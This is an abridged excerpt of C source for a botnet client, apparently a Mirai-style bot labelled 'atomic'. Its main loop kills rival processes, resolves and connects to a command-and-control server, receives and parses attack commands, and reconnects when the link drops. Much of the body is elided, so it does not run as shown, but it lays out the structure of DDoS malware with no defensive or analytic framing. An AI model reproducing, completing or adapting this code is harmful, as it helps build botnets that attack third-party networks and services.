...
int main(int argc, char **args)
{
    ...
    #ifdef DEBUG
        printf("(atomic/main) debug started in pid: %d\n", getpid());
    ...
    while (TRUE)
    {
...
#ifdef DEBUG
            printf("(atomic/main): detected newer instance running! killing process\n");
#endif
            killer_kill();
            attack_kill_all();
            kill(pgid * -1, 9);
        ...
        if(pending_connection)
        {
            ...
            {
                #ifdef DEBUG
                    printf("(atomic/main): timed out while connecting to cnc\n");
                #endif
                teardown_connection();
            }
            else
            {
                ...
                {
                    #ifdef DEBUG
                        printf("(atomic/main): error while connecting to cnc, code=%d\n", err);
                    #endif
                    close(fd_serv);
                    fd_serv = -1;
                ...
                else
                {
                    ...
                    #ifdef DEBUG
                        printf("(atomic/main): connected to cnc successfully\n");
                    #endif
                }
            }
        }
        else if (fd_serv != -1 && FD_ISSET(fd_serv, &fdsetrd))
        {
            ...
            {
#ifdef DEBUG
                printf("(atomic/main): Lost connection with CNC (errno = %d) 1\n", errno);
#endif
                teardown_connection();
                continue;
            }
            ...
            {
#ifdef DEBUG
                printf("(atomic/main): Lost connection with CNC (errno = %d) 2\n", errno);
#endif
                teardown_connection();
                continue;
            }
...
#ifdef DEBUG
            printf("(atomic/main): Received %d bytes from CNC\n", len);
#endif
            ...
            if (attack_parse((const char*)rdbuf, len, &attack) == 0) {
                ...
                {
                    #ifdef DEBUG
                    printf("(atomic/main): unable to parse attack information\n");
                    #endif
                }
            }
        }
...
static void resolve_cnc_addr(void)
{
    ...
    {
    #ifdef DEBUG
        printf("(atomic/main): failed to resolve cnc address from domain\n");
    #endif
        return;
    }
    ...
    #ifdef DEBUG
    printf("(atomic/main): Resolved domain\n");
    #endif
...
{
#ifdef DEBUG
    printf("(atomic/main): Attempting to connect to CNC\n");
#endif

    if ((fd_serv = socket(AF_INET, SOCK_STREAM, 0)) == -1)
    {
#ifdef DEBUG
        printf("(atomic/main): Failed to call socket(). Errno = %d\n", errno);
#endif
        return;
    }
...
{
#ifdef DEBUG
    printf("(atomic/main): Tearing down connection to CNC!\n");
#endif
